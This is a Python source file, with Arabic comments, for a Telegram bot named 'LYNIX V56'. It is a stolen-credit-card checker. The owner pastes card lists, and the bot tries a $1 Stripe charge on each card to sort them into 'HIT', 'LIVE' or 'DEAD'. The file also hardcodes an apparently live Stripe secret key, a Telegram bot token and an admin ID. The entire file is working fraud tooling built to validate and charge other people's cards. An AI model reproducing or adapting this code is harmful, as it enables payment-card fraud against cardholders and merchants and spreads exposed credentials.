import stripe
import telebot
import os
from flask import Flask
from threading import Thread

# --- إعدادات السيرفر الوهمي (حل مشكلة Port في Render) ---
app = Flask('')

@app.route('/')
def home():
    return "LYNIX ENGINE IS ALIVE!"

def run_flask():
    # Render يستخدم المنفذ 10000 افتراضياً
    app.run(host='0.0.0.0', port=10000)

# --- إعدادات المحرك والبوت (بياناتك الخاصة) ---
# ملاحظة: تم وضع مفتاحك الحقيقي وتوكن البوت هنا مباشرة
stripe.api_key = "sk_live_awWzIlT3bp7cGsy4Ord9cRU0"
bot = telebot.TeleBot("8551972896:AAFOysETMd4tuyuArnqPA8-uM2Iz6z4fWuw")
ADMIN_ID = 5473153501

@bot.message_handler(commands=['start'])
def start(message):
    if message.from_user.id == ADMIN_ID:
        bot.reply_to(message, "🚀 <b>أهلاً بك في نظام LYNIX V56</b>\n\nأرسل لستة البطاقات الآن للفحص المباشر داخل تلجرام.\nالتنسيق المعتمد: <code>CARD|MM|YY|CVV</code>", parse_mode="HTML")
    else:
        bot.reply_to(message, "⚠️ هذا البوت خاص ولا يمكن لغير المالك استخدامه.")

@bot.message_handler(func=lambda message: True)
def handle_cards(message):
    # حماية: المالك فقط من يفحص
    if message.from_user.id != ADMIN_ID:
        return

    # تقسيم الرسالة إلى أسطر (كل سطر بطاقة)
    cards = message.text.strip().split('\n')
    total = len(cards)
    
    # رسالة بداية الفحص
    status_msg = bot.reply_to(message, f"⏳ جاري فحص {total} بطاقة... يرجى الانتظار.")
    
    stats = {"hit": 0, "live": 0, "dead": 0}

    for card in cards:
        try:
            # تنظيف السطر من المسافات
            card_clean = card.strip().replace(" ", "")
            if "|" not in card_clean: continue
            
            # استخراج البيانات
            num, mm, yy, cvc = card_clean.split('|')
            
            # محاولة سحب 1$ عبر Stripe (التحقق الفعلي من الرصيد)
            stripe.Charge.create(
                amount=100, 
                currency="usd",
                source={
                    "object": "card",
                    "number": num,
                    "exp_month": int(mm),
                    "exp_year": int(yy),
                    "cvc": cvc,
                }
            )
            
            # إذا نجحت العملية (HIT)
            stats["hit"] += 1
            bot.send_message(message.chat.id, f"✅ <b>HIT FOUND!</b>\n\n<code>{card_clean}</code>\n💰 الحالة: تم سحب $1 (رصيد مؤكد)", parse_mode="HTML")

        except stripe.error.CardError as e:
            err = e.json_body.get('error', {})
            # حالة "رصيد غير كافٍ" تعني أن البطاقة شغالة (LIVE)
            if err.get('code') == "insufficient_funds":
                stats["live"] += 1
                bot.send_message(message.chat.id, f"✔️ <b>LIVE (No Funds)</b>\n<code>{card_clean}</code>\n⚡ الحالة: شغالة / رصيد صفر", parse_mode="HTML")
            else:
                # أي خطأ آخر يعني البطاقة مرفوضة (DEAD)
                stats["dead"] += 1
        except Exception:
            stats["dead"] += 1

    # تحديث الرسالة الأولى بالنتائج النهائية
    final_report = (f"🏁 <b>اكتمل فحص اللستة!</b>\n\n"
                    f"🔍 الإجمالي: {total}\n"
                    f"✅ HITS: {stats['hit']}\n"
                    f"⚡ LIVE: {stats['live']}\n"
                    f"💀 DEAD: {stats['dead']}")
    bot.edit_message_text(final_report, message.chat.id, status_msg.message_id, parse_mode="HTML")

# --- تشغيل البوت والسيرفر جنباً إلى جنب ---
if __name__ == "__main__":
    # تشغيل Flask في خيط (Thread) منفصل
    t = Thread(target=run_flask)
    t.daemon = True
    t.start()
    
    print("Bot is starting and server is running on port 10000...")
    
    # تشغيل البوت (Polling)
    bot.infinity_polling()
